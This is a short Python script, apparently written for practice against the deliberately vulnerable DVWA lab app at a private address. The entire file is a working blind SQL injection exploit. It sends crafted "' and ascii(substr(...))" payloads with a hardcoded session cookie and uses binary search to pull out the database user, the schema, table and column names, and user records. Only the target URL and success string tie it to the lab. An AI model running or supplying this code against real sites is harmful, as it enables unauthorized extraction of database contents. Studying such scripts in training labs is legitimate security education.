# -- coding: utf-8 --
#version: python 3.4
#for:DVWA

import urllib
#import urllib.parse
import urllib3
#import requests


#cookie
headers = {"Cookie": "security=low; PHPSESSID=qfipua6e9cklj86tamh9jroo23","User-Agent": "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.110 Safari/537.36"}

target_url = "http://192.168.174.130/DVWA-master/vulnerabilities/sqli_blind/?Submit=Submit&id=1"
success_str = "User ID exists in the database."

length_payload = "' and length(%s)>=%d #"
char_payload = "' and ascii(substr(%s,%d,1))>=%d #"

table_name = "(select table_name from information_schema.tables where table_schema='%s' limit %d,1)"
column_name = "(select column_name from information_schema.columns where table_schema='%s' and table_name='%s' limit %d,1)"
column_data = "(select %s from %s.%s limit %d, 1)"

ascii_start = 33
ascii_end = 126

max_length = 50

def sendRequest(payload):
    url = target_url + urllib.parse.quote(payload)
    print(url)
    try:
        http = urllib3.PoolManager()
        request = http.request('GET',url=url,headers=headers)
        #print(request.status)
        #print(request.data.decode())        
        response = request.data.decode()
        #print(response)
        if success_str in response:
            #print('yes')
            return True
        else:
            return False
    except:
        return False

def getLength(start,end,command):
    if (start+1) == end:return start
    mid = (end+start) // 2
    print(mid)
    if sendRequest(length_payload % (command,mid)):
        start = mid
    else:
        end = mid
    
    result = getLength(start,end,command)
    return result

def getSingleChar(start,end,command,pos):
    if (start+1) == end:return start
    mid = (end+start) // 2
    if sendRequest(char_payload % (command,pos,mid)):
        start = mid
    else:
        end = mid
    
    result = getSingleChar(start,end,command,pos)
    return result

def getInfo(command):
    pos = 1
    info = ""
    maxLen = getLength(1,max_length,command)
    print(command,"length:",maxLen)
    while 1:
        if pos > maxLen:break
        info += chr(getSingleChar(ascii_start,ascii_end,command,pos))
        pos += 1
        print(info)

getInfo("user()")
#getInfo("database()")
#getInfo(table_name % ("dvwa",1))
#getInfo(column_name % ("dvwa","users",1))
#getInfo(column_name % ("dvwa","users",3))
#getInfo(column_data % ("user","dvwa","users",0))

